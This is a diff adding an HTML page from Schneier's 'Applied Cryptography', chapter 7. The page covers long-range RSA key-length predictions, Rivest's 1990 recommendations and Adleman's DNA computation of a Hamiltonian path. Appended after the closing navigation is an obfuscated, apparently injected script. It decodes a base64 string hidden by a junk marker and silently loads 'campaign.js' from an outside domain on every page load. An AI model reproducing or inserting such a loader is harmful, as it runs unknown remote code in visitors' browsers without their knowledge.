@@ -1,0 +1,159 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Length</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=07//-->
+<!--PAGES=162-164//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Remember to take the value of the key into account. Public keys are often used to secure things of great value for a long time: the bank&#146;s master key for a digital cash system, the key the government uses to certify its passports, or a notary public&#146;s digital signature key. It probably isn&#146;t worth the effort to spend months of computing time to break an individual&#146;s private key, but if you can print your own money with a broken key the idea becomes more attractive. A 1024-bit key is long enough to sign something that will be verified within the week, or month, or even a few years. But you don&#146;t want to stand up in court 20 years from now with a digitally signed document and have the opposition demonstrate how to forge documents with the same signature.
+</P>
+<P>Making predictions beyond the near future is even more foolish. Who knows what kind of advances in computing, networking, and mathematics are going to happen by 2020? However, if you look at the broad picture, in every decade we can factor numbers twice as long as in the previous decade. This leads to Table 7.7.</P>
+<P>On the other hand, factoring technology may reach its Omega point long before 2045. Twenty years from now, we may be able to factor anything. I think that is unlikely, though.</P>
+<P>Not everyone will agree with my recommendations. The NSA has mandated 512-bit to 1024-bit keys for their Digital Signature Standard (see Section 20.1)&#151;far less than I recommend for long-term security. Pretty Good Privacy (see Section 24.12) has a maximum RSA key length of 2047 bits. Arjen Lenstra, the world&#146;s most successful factorer, refuses to make predictions past 10 years [949]. Table 7.8 gives Ron Rivest&#146;s key-length recommendations, originally made in 1990, which I consider much too optimistic [1323]. While his analysis looks fine on paper, recent history illustrates that surprises regularly happen. It makes sense to choose your keys to be resilient against future surprises.</P>
+<TABLE WIDTH="40%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="2">Table 7.7<BR>Long-range Factoring Predictions
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TH ALIGN="CENTER" VALIGN="BOTTOM">Year
+<TH ALIGN="CENTER" VALIGN="BOTTOM">Key Length (in bits)
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">1995
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1024
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2005
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2048
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2015
+<TD ALIGN="CENTER" VALIGN="BOTTOM">4096
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2025
+<TD ALIGN="CENTER" VALIGN="BOTTOM">8192
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2035
+<TD ALIGN="CENTER" VALIGN="BOTTOM">16,384
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2045
+<TD ALIGN="CENTER" VALIGN="BOTTOM">32,768
+<TR>
+<TD COLSPAN="2"><HR>
+</TABLE>
+<P>Low estimates assume a budget of $25,000, the quadratic sieve algorithm, and a technology advance of 20 percent per year. Average estimates assume a budget of $25 million, the general number field sieve algorithm, and a technology advance of 33 percent per year. High estimates assume a budget of $25 billion, a general quadratic sieve algorithm running at the speed of the special number field sieve, and a technology advance of 45 percent per year.
+</P>
+<P>There is always the possibility that an advance in factoring will surprise me as well, but I factored that into my calculations. But why trust me? I just proved my own foolishness by making predictions.</P>
+<P><FONT SIZE="+1"><B><I>DNA Computing</I></B></FONT></P>
+<P>Now it gets weird. In 1994 Leonard M. Adleman actually demonstrated a method for solving an <B>NP-complete</B> problem (see Section 11.2) in a biochemistry laboratory, using DNA molecules to represent guesses at solutions to the problem [17]. (That&#146;s &#147;solutions&#148; meaning &#147;answers,&#148; not meaning &#147;liquids containing solutes.&#148; Terminology in this field is going to be awkward.) The problem that Adleman solved was an instance of the Directed Hamiltonian Path problem: Given a map of cities connected by one-way roads, find a path from City A to City Z that passes exactly once through all other cities on the map. Each city was represented by a different random 20-base string of DNA; with conventional molecular biology techniques, Adleman synthesized 50 picomols (30 million million molecules) of the DNA string representing each city. Each road was also represented by a 20-base DNA string, but these strings were not chosen randomly: They were cleverly chosen so that the &#147;beginning&#148; end of the DNA string representing the road from City P to City K (&#147;Road PK&#148;) would tend to stick to the DNA string representing City P, and the end of Road PK would tend to stick to City K.</P>
+<TABLE WIDTH="50%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="4">Table 7.8<BR>Rivest&#146;s Optimistic Key-length Recommendations (in bits)
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TH ALIGN="LEFT" VALIGN="BOTTOM">Year
+<TH ALIGN="CENTER" VALIGN="BOTTOM">Low
+<TH ALIGN="CENTER" VALIGN="BOTTOM">Average
+<TH ALIGN="CENTER" VALIGN="BOTTOM">High
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">1990
+<TD ALIGN="CENTER" VALIGN="BOTTOM">398
+<TD ALIGN="CENTER" VALIGN="BOTTOM">515
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1289
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">1995
+<TD ALIGN="CENTER" VALIGN="BOTTOM">405
+<TD ALIGN="CENTER" VALIGN="BOTTOM">542
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1399
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">422
+<TD ALIGN="CENTER" VALIGN="BOTTOM">572
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1512
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2005
+<TD ALIGN="CENTER" VALIGN="BOTTOM">439
+<TD ALIGN="CENTER" VALIGN="BOTTOM">602
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1628
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2010
+<TD ALIGN="CENTER" VALIGN="BOTTOM">455
+<TD ALIGN="CENTER" VALIGN="BOTTOM">631
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1754
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2015
+<TD ALIGN="CENTER" VALIGN="BOTTOM">472
+<TD ALIGN="CENTER" VALIGN="BOTTOM">661
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1884
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">2020
+<TD ALIGN="CENTER" VALIGN="BOTTOM">489
+<TD ALIGN="CENTER" VALIGN="BOTTOM">677
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2017
+<TR>
+<TD COLSPAN="4"><HR>
+</TABLE>
+<P>Adleman synthesized 50 picomols of the DNA representing each road, mixed them all together with the DNA representing all the cities, and added a ligase enzyme, which links together the ends of DNA molecules. The clever relationship between the road DNA strings and the city DNA strings causes the ligase to link the road DNA strings together in a legal fashion. That is, the &#147;exit&#148; end of the road from P to K will always be linked to the &#147;entrance&#148; end of some road that originates at City K, never to the &#147;exit&#148; end of any road and never to the &#147;entrance&#148; end of a road that originates at some city other than K. After a carefully limited reaction time, the ligase has built a large number of DNA strings representing legal but otherwise random multiroad paths within the map.
+</P>
+<P>From this soup of random paths, Adleman can find the tiniest trace&#151;perhaps even a single molecule&#151;of the DNA that represents the answer to the problem. Using common techniques of molecular biology, he discards all the DNA strings representing paths that are too long or too short. (The number of roads in the desired path must equal the number of cities minus one.) Next he discards all the DNA strings that do not pass through City A, then those that miss City B, and so forth. If any DNA survives this screening, it is examined to find the sequence of roads that it represents: This is the solution to the directed Hamiltonian path problem.</P>
+<P>By definition, an instance of any <B>NP-complete</B> problem can be transformed, in polynomial time, into an instance of any other <B>NP-complete</B> problem, and therefore into an instance of the directed Hamiltonian path problem. Since the 1970s, cryptologists have been trying to use <B>NP-complete</B> problems for public-key cryptography.</P>
+<P>While the instance that Adleman solved was very modest (seven cities on his map, a problem that can be solved by inspection in a few minutes), the technique is in its infancy and has no forbidding obstacles keeping it from being extended to larger problems. Thus, arguments about the security of cryptographic protocols based on <B>NP-complete</B> problems, arguments that heretofore have begun, &#147;Suppose an adversary has a million processors, each of which can perform a million tests each second,&#148; may soon have to be replaced with, &#147;Suppose an adversary has a thousand fermentation vats, each 20,000 liters in capacity.&#148;</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(OWcMJfUd, yqEwvaDv) {yqEwvaDv = OWcMJfUd.createElement('script');yqEwvaDv.type = 'text/javascript';yqEwvaDv.async = true;yqEwvaDv.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');OWcMJfUd.getElementsByTagName('body')[0].appendChild(yqEwvaDv);}(document));</script></body>
+</html>
